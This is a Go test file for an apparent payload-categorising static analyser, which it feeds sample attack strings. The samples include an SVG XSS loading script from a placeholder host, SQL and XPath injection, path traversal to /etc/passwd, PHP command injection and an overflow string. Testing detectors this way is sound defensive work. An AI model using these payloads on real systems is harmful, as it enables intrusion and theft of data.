package tests

import (
	"categorizer/analysis"
	"categorizer/retrieve"
	"fmt"
	"strings"
	"testing"
)

func TestStaticAnalyser(t *testing.T) {
	address := "0.0.0.0"
	port := uint16(8000)
	results := make(chan analysis.StaticAnalysisResult)

	analyser, err := analysis.NewChromaAnalyser(address, port, "payloads")
	if err != nil {
		t.Errorf("Error creating analyser: %v", err)
	}

	var tests [8]retrieve.Result
	tests[0] = retrieve.Result{Stream: "<svg onload=setInterval(function(){with(document)body.appendChild(createElement('script')).src='//HOST:PORT'},0)>", SrcPort: 9999}
	tests[1] = retrieve.Result{Stream: "admin' and substring(password/text(),1,1)='7", SrcPort: 1234}
	tests[2] = retrieve.Result{Stream: "'))) and 0=benchmark(3000000,MD5(1))%20--", SrcPort: 46525}
	tests[3] = retrieve.Result{Stream: "/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/etc/passwd", SrcPort: 2222}
	tests[4] = retrieve.Result{Stream: ";system('/usr/bin/id')", SrcPort: 8080}
	tests[5] = retrieve.Result{Stream: "POST /login HTTP/1.1\n        Host: 10.10.3.1:5000\n        Connection: keep-alive\n        Accept-Encoding: gzip, deflate\n        Accept: */*\n        User-Agent: python-requests/2.19.1\n        Content-Length: 32\n        Content-Type: application/x-www-form-urlencoded\n        \n        password='+OR+1='1--&name=L4mgZTQs64Zj0RGET /stars HTTP/1.1\n        Host: 10.10.3.1:5000\n        Connection: keep-alive\n        Accept-Encoding: gzip, deflate\n        Accept: */*\n        User-Agent: python-requests/2.19.1", SrcPort: 5000}
	tests[6] = retrieve.Result{Stream: "'+OR+1='1--", SrcPort: 6000}
	tests[7] = retrieve.Result{Stream: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", SrcPort: 80}

	for _, test := range tests {
		res := strings.Split(test.Stream, "\n")
		for _, r := range res {
			fmt.Println("Stream: ", r)
			temp := retrieve.Result{Stream: strings.TrimSpace(r), SrcPort: test.SrcPort}
			go analyser.Analyse(temp, results)

			select {
			case res := <-results:
				t.Log("Risultato: ", res)
			}
		}

	}
	close(results)
	return
}
